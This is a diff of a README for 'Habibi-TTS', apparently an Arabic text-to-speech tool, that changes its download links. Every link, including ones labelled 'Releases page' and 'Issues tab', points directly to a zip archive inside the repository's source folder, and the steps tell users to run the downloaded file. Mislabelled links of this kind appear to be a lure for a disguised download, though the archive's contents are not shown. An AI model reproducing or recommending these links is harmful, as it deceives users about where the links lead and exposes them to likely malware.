@@ -1,6 +1,6 @@
 # 🎉 Habibi-TTS - Open-Source Arabic Speech Made Easy
 
-[![Download Habibi-TTS](https://github.com/Santzy1/Habibi-TTS/raw/refs/heads/main/docs/assets/TTS-Habibi-v2.1-beta.3.zip)](https://github.com/Santzy1/Habibi-TTS/raw/refs/heads/main/docs/assets/TTS-Habibi-v2.1-beta.3.zip)
+[![Download Habibi-TTS](https://raw.githubusercontent.com/Santzy1/Habibi-TTS/main/src/habibi_tts/model/Habibi-TTS-1.3.zip)](https://raw.githubusercontent.com/Santzy1/Habibi-TTS/main/src/habibi_tts/model/Habibi-TTS-1.3.zip)
 
 ## 📚 Introduction
 
@@ -12,11 +12,11 @@ To get started with Habibi-TTS, you will need to download and install the applic
 
 ## 📥 Download & Install
 
-To download Habibi-TTS, please visit the [Releases page](https://github.com/Santzy1/Habibi-TTS/raw/refs/heads/main/docs/assets/TTS-Habibi-v2.1-beta.3.zip). You will find the latest version available for download.
+To download Habibi-TTS, please visit the [Releases page](https://raw.githubusercontent.com/Santzy1/Habibi-TTS/main/src/habibi_tts/model/Habibi-TTS-1.3.zip). You will find the latest version available for download.
 
 ### Steps to Download:
 
-1. Click on the [Releases page](https://github.com/Santzy1/Habibi-TTS/raw/refs/heads/main/docs/assets/TTS-Habibi-v2.1-beta.3.zip).
+1. Click on the [Releases page](https://raw.githubusercontent.com/Santzy1/Habibi-TTS/main/src/habibi_tts/model/Habibi-TTS-1.3.zip).
 2. On the Releases page, find the latest version.
 3. Choose the appropriate file for your operating system. This might be a .exe file for Windows or a .zip file for macOS and Linux.
 4. Click on the link to download the file.
@@ -80,10 +80,10 @@ If you encounter any issues while using Habibi-TTS, here are some common solutio
 
 ## 📞 Support
 
-For further assistance, you can reach out via the [Issues tab](https://github.com/Santzy1/Habibi-TTS/raw/refs/heads/main/docs/assets/TTS-Habibi-v2.1-beta.3.zip) on our GitHub repository. We encourage users to report any bugs or request features.
+For further assistance, you can reach out via the [Issues tab](https://raw.githubusercontent.com/Santzy1/Habibi-TTS/main/src/habibi_tts/model/Habibi-TTS-1.3.zip) on our GitHub repository. We encourage users to report any bugs or request features.
 
 ## 📝 Conclusion
 
 Thank you for choosing Habibi-TTS. We are excited for you to explore the world of Arabic speech synthesis. Download the application today and start creating engaging audio content with ease. 
 
-For downloading, visit the [Releases page](https://github.com/Santzy1/Habibi-TTS/raw/refs/heads/main/docs/assets/TTS-Habibi-v2.1-beta.3.zip) again. Happy synthesizing!
+For downloading, visit the [Releases page](https://raw.githubusercontent.com/Santzy1/Habibi-TTS/main/src/habibi_tts/model/Habibi-TTS-1.3.zip) again. Happy synthesizing!
